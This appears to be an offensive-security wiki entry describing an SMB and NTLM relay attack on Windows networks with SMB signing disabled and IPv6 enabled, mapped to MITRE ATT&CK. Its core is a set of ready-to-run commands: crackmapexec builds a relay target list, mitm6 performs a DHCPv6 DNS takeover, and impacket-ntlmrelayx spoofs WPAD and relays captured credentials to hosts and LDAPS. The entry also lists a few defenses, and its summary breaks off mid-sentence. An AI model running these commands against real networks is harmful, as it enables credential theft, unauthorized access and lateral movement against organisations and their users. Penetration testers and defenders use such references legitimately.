---
id: 5c203d4d-cd11-4622-b2bc-19ba218038fc
name: SMB and NTLM Relay Attack against SMB Signing Disabled and IPv6
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.475202+00:00'
updated_at: '2023-04-10T20:25:58.216889+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Man-in-the-Middle attacks & relaying]]'
- '[[SMB Signing Disabled and IPv6]]'
commands:
- '[[DNS Takeover via IPv6]]'
- '[[Generate Relay List]]'
- '[[NTLM Relay]]'
- '[[Spoofing WPAD and Relaying NTLM Credentials]]'
---

# SMB and NTLM Relay Attack against SMB Signing Disabled and IPv6

## Summary

An SMB and NTLM Relay Attack can be used against systems with SMB Signing Disabled and IPv6 enabled. This attack involves intercepting SMB traffic and relaying it to another system, allowing an attacker to gain unauthorized access to sensitive information. The attack can be performed by an attacker

## Description

# Description

An SMB and NTLM Relay Attack can be used against systems with SMB Signing Disabled and IPv6 enabled. This attack involves intercepting SMB traffic and relaying it to another system, allowing an attacker to gain unauthorized access to sensitive information. The attack can be performed by an attacker who has already compromised a system on the network or by using a phishing attack to gain initial access. This type of attack can be particularly damaging as it can allow an attacker to move laterally through the network and gain access to additional systems and data.

 

## Requirements

1. Access to a system on the network

1. SMB Signing Disabled

1. IPv6 enabled

 

## Defense

1. Enable SMB Signing to prevent interception of SMB traffic

1. Disable IPv6 if it is not necessary for business operations

1. Implement network segmentation to limit lateral movement

 

## Objectives

1. Gain unauthorized access to sensitive information

1. Move laterally through the network

1. Compromise additional systems and data

 

# Instructions

1. The above command can be used for a SMB and NTLM Relay Attack. The command uses CrackMapExec to generate a relay list, mitm6 to request an IPv6 address via DHCPv6 and Impacket-ntlmrelayx to spoof WPAD and relay NTLM credentials. You can specify the interface you want the relay to run on using the -ip option, the WPAD host using -wh and the target where you want to relay to using -t.

 



**Code**: [[crackmapexec smb $hosts --gen-relay-list relay.txt]]



> The SMB and NTLM Relay Attack is a type of attack where an attacker intercepts the communication between a client and a server and relays it to another server. In this case, the attacker intercepts SMB traffic and relays it to a target server. The attacker can then gain access to the target server by using the credentials of the client. This attack can be used to gain access to sensitive information or to perform other malicious activities.



**Command** ([[Generate Relay List]]):

```bash
crackmapexec smb $hosts --gen-relay-list relay.txt
```





**Command** ([[DNS Takeover via IPv6]]):

```bash
mitm6 -i eth0 -d $domain
```





**Command** ([[Spoofing WPAD and Relaying NTLM Credentials]]):

```bash
impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt
impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug
```





**Command** ([[NTLM Relay]]):

```bash
impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]

## Commands Used

- [[DNS Takeover via IPv6]]
- [[Generate Relay List]]
- [[NTLM Relay]]
- [[Spoofing WPAD and Relaying NTLM Credentials]]

## Tags

- [[Active Directory Attacks]]
- [[Man-in-the-Middle attacks & relaying]]
- [[SMB Signing Disabled and IPv6]]


